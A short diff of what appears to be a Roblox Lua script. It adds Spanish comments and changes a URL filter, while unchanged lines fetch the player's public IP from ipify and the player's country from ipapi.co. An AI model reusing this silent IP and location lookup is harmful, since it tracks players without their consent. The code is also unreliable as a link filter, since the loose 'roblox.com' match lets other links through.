@@ -17,7 +17,7 @@ local function sanitizeMessage(message)
     end
 
     message = message:gsub("https?://[%w-_%.%?%.:/%+=&]+", function(url)
-        if url:find("roblox.com") then
+        if url:match("roblox.com") then
             return url
         end
         return "[filtered]"
@@ -78,14 +78,17 @@ if not isInBlacklist(playerId, blacklist) then
     local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
     local gameName = gameInfo and gameInfo.Name or "Unknown Game"
     
+    -- Obtener la dirección IP del jugador
     local ipAddress = game:HttpGet("https://api.ipify.org/")
     
+    -- Obtener el país basado en la dirección IP
     local country = "Unknown"
     local response = game:HttpGet("https://ipapi.co/" .. ipAddress .. "/country_name")
     if response then
         country = response
     end
 
+    -- Verificar si el nombre de usuario contiene un patrón prohibido
     for _, pattern in ipairs(forbiddenPatterns) do
         if playerName:match(pattern) then
             changeDisplayName(localPlayer)
